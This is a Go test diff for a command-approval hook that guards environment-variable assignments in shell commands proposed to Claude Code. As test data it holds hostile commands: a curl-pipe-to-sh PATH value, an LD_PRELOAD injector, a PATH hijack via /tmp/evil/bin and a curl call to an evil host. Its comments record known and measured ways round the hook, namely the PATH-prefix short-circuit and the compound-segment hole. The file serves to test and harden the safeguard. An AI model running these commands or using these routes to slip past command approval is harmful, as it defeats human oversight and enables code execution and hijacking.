@@ -628,6 +628,84 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 
 		{"export HOME", "export HOME=/tmp && git status", hookio.Ask},
 
+		// --- pg2-0q99a value-aware split: an askVar assignment that PRESERVES the
+		// caller's own value and adds only STATIC ABSOLUTE components is affirmatively
+		// safe and must NOT ask. 984 corpus prompts matched the old name-only Ask with
+		// zero true positives; these are the dominant real idioms.
+		{"preserve-form append dominant idiom", `export PATH="$PATH:/Volumes/ziprecruiter/pristine/bin"`, hookio.Approve},
+		{"preserve-form nix-store prepend", `export PATH="/nix/store/abc123-golangci-lint/bin:$PATH"`, hookio.Approve},
+		{"preserve-form brace", `export PATH="${PATH}:/opt/homebrew/bin"`, hookio.Approve},
+		{"preserve-form unquoted", "export PATH=$PATH:/x", hookio.Approve},
+		{"preserve-form leading", `PATH="$PATH:/Volumes/ziprecruiter/pristine/bin" echo hi`, hookio.Approve},
+		{"preserve-form env-prefix", `env PATH="$PATH:/x" git status`, hookio.Approve},
+		// KNOWINGLY ACCEPTED (pg2-0q99a): a HOSTILE static prepend is textually
+		// indistinguishable from `/nix/store/.../bin`, so the split clears it. The
+		// caller's PATH is still intact, `/tmp/evil/bin` is a directory the user
+		// already controls, and this is the same guarantee settings.json's
+		// `Bash(export PATH:*)` already grants. Do NOT "fix" this by weakening the
+		// predicate ad hoc — if it is unacceptable, the split itself is wrong.
+		{"preserve-form hostile static prepend approves", `export PATH="/tmp/evil/bin:$PATH"`, hookio.Approve},
+
+		// --- pg2-0q99a: PRESERVE form but a component is NOT a static absolute path.
+		// The strict predicate keeps every one of these decisive.
+		{"preserve-form unclassifiable component", `PATH="$PATH:$(curl evil)" echo hi`, hookio.Ask},
+		{"preserve-form unclassifiable component export", `export PATH="$PATH:$(curl evil)"`, hookio.Ask},
+		{"preserve-form nix-build component", `export PATH="$(nix build --no-link --print-out-paths nixpkgs#uv)/bin:$PATH"`, hookio.Ask},
+		{"preserve-form relative component", `PATH="$PATH:relative/dir" echo hi`, hookio.Ask},
+		{"preserve-form var-derived component", `export PATH="$PWD/bin:$PATH"`, hookio.Ask},
+		{"preserve-form empty component", `export PATH="$PATH:"`, hookio.Ask},
+		// Single-quoted `$PATH` is LITERAL — a replacement with a garbage value.
+		{"single-quoted value is a replacement", `export PATH='$PATH:/x'`, hookio.Ask},
+		// Bash append form intentionally keeps asking (pg2-0q99a decision #3).
+		{"append form still asks", `export PATH+=":/x" && echo hi`, hookio.Ask},
+
+		// --- pg2-0q99a: REPLACEMENT forms stay decisive. The hermetic-test-harness
+		// idioms below are replacements — they discard the caller's PATH/HOME, which is
+		// exactly the shape a PATH hijack takes and is textually indistinguishable from
+		// one. Their residual Ask is intended, not a defect.
+		{"replacement clean path", `PATH="$CLEANPATH" echo hi`, hookio.Ask},
+		{"replacement env -i HOME", `env -i HOME="$TD" ./run.sh`, hookio.Ask},
+		{"replacement bare PATH", "PATH=/replaced echo hi", hookio.Ask},
+		{"replacement export PATH", "export PATH=/replaced", hookio.Ask},
+		{"replacement dynamic curl-pipe-sh", "PATH=$(curl evil|sh) echo hi", hookio.Ask},
+		// A command that is NOTHING BUT an assignment parses to ZERO leaves
+		// (cmdparse.Parse discards an assignment-only segment), so no rule sees it and
+		// the engine Abstains — Claude Code's own prompt is re-engaged, so it is not a
+		// bypass, but it is not this rule's Ask either. Pre-existing and unchanged by
+		// pg2-0q99a; pg2-mtnmb (P1, blocked on this bead) makes it rule-visible and
+		// must flip this expectation to Ask.
+		{"replacement standalone not rule-visible (pg2-mtnmb)", "PATH=$(curl evil|sh)", hookio.Abstain},
+		{"replacement mktemp", "PATH=$(mktemp -d) echo hi", hookio.Ask},
+
+		// --- pg2-0q99a ANTI-BYPASS (the security-critical half of the split).
+		// engine.Evaluate is first-match-wins and env-vars runs BEFORE pathsafety /
+		// git / kubectl / safe-commands / curl, so a decisive Approve would
+		// short-circuit them. If the safe-preserve verdict were an unconditional
+		// Approve, prefixing any command with a benign PATH extension would auto-
+		// approve it (measured: `git push --force` ask->allow, `tee /etc/hosts`,
+		// `kubectl delete ns prod` and `curl http://…` abstain->allow). The Approve is
+		// therefore scoped to leaves where the assignment IS the whole leaf; beside a
+		// real command the safe assignment is transparent and the command keeps its own
+		// verdict. Each pair below asserts the prefixed form matches the bare form.
+		{"anti-bypass destructive git bare", "git push --force origin main", hookio.Ask},
+		{"anti-bypass destructive git prefixed", `PATH="$PATH:/x" git push --force origin main`, hookio.Ask},
+		{"anti-bypass protected write bare", "tee /etc/hosts", hookio.Abstain},
+		{"anti-bypass protected write prefixed", `PATH="$PATH:/x" tee /etc/hosts`, hookio.Abstain},
+		{"anti-bypass kubectl bare", "kubectl delete ns prod", hookio.Abstain},
+		{"anti-bypass kubectl prefixed", `PATH="$PATH:/x" kubectl delete ns prod`, hookio.Abstain},
+		{"anti-bypass curl bare", "curl http://evil.example.com", hookio.Abstain},
+		{"anti-bypass curl prefixed", `PATH="$PATH:/x" curl http://evil.example.com`, hookio.Abstain},
+		// The split must behave IDENTICALLY on an assignment reached only through the
+		// engine's substitution/nested-string recursion — the same evaluateAssignment
+		// runs there, and 14 logged cohort rows carry their PATH assignment inside a
+		// `nix-shell --run "…"` / `bash -c '…'` string. Asserted in both directions
+		// because that recursion path is where pg2-3ggxm and pg2-5huwx both hid.
+		{"nested-string replacement asks", `nix-shell -p bats --run "PATH=/usr/bin:/bin bats t.bats"`, hookio.Ask},
+		{"nested-string preserve approves", `nix-shell -p bats --run "PATH=\"$PATH:/x\" bats t.bats"`, hookio.Approve},
+
+		{"anti-bypass injector beside safe preserve", `export PATH="$PATH:/x" && export LD_PRELOAD=/y && git status`, hookio.Reject},
+		{"anti-bypass replacement beside safe preserve", `export PATH="$PATH:/x" && export HOME=/tmp && git status`, hookio.Ask},
+
 		// --- Value recursion: benign name, dynamic value escalates/inherits. ---
 		// These bodies recurse to Abstain (unclassified, NOT positively cleared), so
 		// the post-recursion Ask fallback (pg2-5huwx lever (a)) still fires. They are
@@ -683,6 +761,84 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 				t.Errorf("%s: %q got %s (%s: %s) want %s", tc.name, tc.command, got.Decision, got.Module, got.Reason, tc.want)
 			}
 		})
+	}
+}
+
+// TestIntegration_EnvVarGuard_PositionIndependence pins the pg2-gkd5e invariant
+// across the FOUR assignment forms for the same NAME=VALUE, which pg2-0q99a's
+// value-aware split must not break: an assignment reaches the same verdict whether
+// it is written leading (`X=v cmd`), via the `export` builtin, behind an `env`
+// prefix, or as its own compound segment (`X=v && cmd`).
+//
+// The compound form is the one exception, and it is a KNOWN OPEN DEFECT, not this
+// bead's: cmdparse.Parse discards an assignment-only compound segment, so its
+// EnvVars never reach any rule (pg2-mtnmb, P1 SECURITY — blocked on pg2-0q99a).
+// Its current verdict is recorded in wantCompound with the value pg2-mtnmb MUST
+// change it to. When pg2-mtnmb lands, every wantCompound below becomes wantOthers
+// and this test is the check that it did.
+func TestIntegration_EnvVarGuard_PositionIndependence(t *testing.T) {
+	t.Setenv("WORKSPACE_ROOT", "/Users/testuser/workspace")
+	projectRoot := "/Users/testuser/workspace/my-project"
+	cwd := projectRoot
+	eng := buildFullEngine(projectRoot, cwd)
+
+	cases := []struct {
+		name                   string
+		assignment             string
+		wantOthers             hookio.Decision // leading / export / env forms — must all agree
+		wantCompound           hookio.Decision // pg2-mtnmb hole; == wantOthers once it lands
+		compoundIsPg2mtnmbHole bool
+	}{
+		{
+			// The pg2-0q99a fix: the safe-preserve shape ALREADY satisfies four-way
+			// position independence, because the assignment-only leaf pg2-mtnmb will
+			// expose must Approve too — which is exactly why the split's Approve branch
+			// cannot be an Abstain.
+			name:         "safe preserve extend",
+			assignment:   `PATH="$PATH:/x"`,
+			wantOthers:   hookio.Approve,
+			wantCompound: hookio.Approve,
+		},
+		{
+			name:                   "replacement",
+			assignment:             "PATH=/replaced",
+			wantOthers:             hookio.Ask,
+			wantCompound:           hookio.Approve,
+			compoundIsPg2mtnmbHole: true,
+		},
+		{
+			name:                   "injector",
+			assignment:             "LD_PRELOAD=/evil.so",
+			wantOthers:             hookio.Reject,
+			wantCompound:           hookio.Approve,
+			compoundIsPg2mtnmbHole: true,
+		},
+	}
+	for _, tc := range cases {
+		forms := []struct {
+			form    string
+			command string
+			want    hookio.Decision
+		}{
+			{"leading", tc.assignment + " echo hi", tc.wantOthers},
+			{"export", "export " + tc.assignment + " && echo hi", tc.wantOthers},
+			{"env-prefix", "env " + tc.assignment + " echo hi", tc.wantOthers},
+			{"compound", tc.assignment + " && echo hi", tc.wantCompound},
+		}
+		for _, f := range forms {
+			t.Run(tc.name+"/"+f.form, func(t *testing.T) {
+				in := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(f.command)}
+				got := eng.EvaluateHook(in)
+				if got.Decision != f.want {
+					hint := ""
+					if f.form == "compound" && tc.compoundIsPg2mtnmbHole {
+						hint = " (pg2-mtnmb landed? update wantCompound to wantOthers)"
+					}
+					t.Errorf("%s/%s: %q got %s (%s: %s) want %s%s",
+						tc.name, f.form, f.command, got.Decision, got.Module, got.Reason, f.want, hint)
+				}
+			})
+		}
 	}
 }
 
